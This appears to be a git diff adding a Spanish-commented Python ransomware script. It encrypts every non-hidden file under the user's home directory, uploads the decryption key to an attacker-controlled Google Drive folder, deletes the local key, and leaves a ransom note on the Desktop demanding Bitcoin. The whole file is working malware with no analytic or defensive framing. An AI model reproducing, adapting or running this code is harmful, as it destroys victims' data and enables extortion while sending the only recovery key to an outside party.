@@ -1,0 +1,109 @@
+# vesrion 2
+
+import os
+import json
+import hashlib
+from cryptography.fernet import Fernet
+from googleapiclient.discovery import build
+from googleapiclient.http import MediaFileUpload
+from google.oauth2 import service_account
+
+# --- Configuración ---
+EXTENSIONES_PROHIBIDAS = ['.so', '.exe', '.dll', '.img', '.iso']
+ARCHIVOS_EXCLUIDOS = ['key.key', 'encripta.py', 'desencripta.py', 'hashes.json']
+SCOPES = ['https://www.googleapis.com/auth/drive']
+EMAIL_DESTINO = 'guzman.sadym@gmail.com'
+PARENT_FOLDER_ID = "1CJi8m_p2fjjA1HcyR8ThUZq7aJ_uCg8b"
+
+# --- Credenciales de cuenta de servicio incrustadas directamente ---
+SERVICE_ACCOUNT_FILE = {
+# CREDS de API GOOGLE DRIVE
+}
+
+# --- Funciones ---
+def generar_key(path="key.key"):
+    key = Fernet.generate_key()
+    with open(path, "wb") as f:
+        f.write(key)
+    return key
+
+def calcular_hash(data):
+    return hashlib.sha256(data).hexdigest()
+
+def es_oculto(path):
+    return any(p.startswith('.') for p in path.split(os.sep))
+
+def encontrar_archivos(ruta_home, key_path, script_path):
+    archivos = []
+    for dirpath, _, filenames in os.walk(ruta_home):
+        if es_oculto(dirpath):
+            continue
+        for nombre in filenames:
+            full_path = os.path.join(dirpath, nombre)
+            _, ext = os.path.splitext(nombre)
+            if (
+                ext.lower() in EXTENSIONES_PROHIBIDAS or
+                full_path == key_path or
+                full_path == script_path or
+                nombre in ARCHIVOS_EXCLUIDOS
+            ):
+                continue
+            archivos.append(full_path)
+    return archivos
+
+def encriptar_archivos(archivos, key):
+    f = Fernet(key)
+    hashes = {}
+    for archivo in archivos:
+        try:
+            with open(archivo, "rb") as file:
+                datos = file.read()
+            hash_original = calcular_hash(datos)
+            datos_encriptados = f.encrypt(datos)
+            with open(archivo, "wb") as file:
+                file.write(datos_encriptados)
+            hashes[archivo] = hash_original
+            print(f"✔ Encriptado: {archivo}")
+        except Exception as e:
+            print(f"✘ Error con {archivo}: {e}")
+    return hashes
+
+def subir_archivo(nombre_local):
+    creds = service_account.Credentials.from_service_account_info(SERVICE_ACCOUNT_FILE, scopes=SCOPES)
+    service = build('drive', 'v3', credentials=creds)
+
+    file_metadata = {
+        'name': 'key.key',
+        'parents': [PARENT_FOLDER_ID]
+    }
+
+    media = MediaFileUpload(nombre_local, resumable=True)
+    archivo = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
+    print(f"[☁] Archivo subido a Google Drive con ID: {archivo.get('id')}")
+
+# --- Ejecución principal ---
+if __name__ == "__main__":
+    ruta_home = os.path.expanduser("~")
+    key_path = os.path.realpath("key.key")
+    script_path = os.path.realpath(__file__)
+
+    if not os.path.exists("key.key"):
+        key = generar_key()
+    else:
+        with open("key.key", "rb") as f:
+            key = f.read()
+
+    archivos = encontrar_archivos(ruta_home, key_path, script_path)
+    hashes = encriptar_archivos(archivos, key)
+
+    with open("hashes.json", "w") as f:
+        json.dump(hashes, f)
+
+    subir_archivo("key.key")
+    os.remove("key.key")
+
+    escritorio = os.path.join(ruta_home, "Desktop")
+    with open(os.path.join(escritorio, "INSTRUCCIONES.txt"), "w") as f:
+        f.write("Sus archivos fueron encriptados y solo pueden ser recuperados con una clave secreta y un programa que puede obtener depositando 1 dolar en mi cartera de Bitcoin: frf-19.353.201--2***HAWm473-wrw. Saludos.")
+
+    print("\n[🔒] Encriptación completada y clave secreta eliminada de sistema local. LEER INSTRUCCIONES EN ESCRITORIO PARA RECUPERAR DATOS")
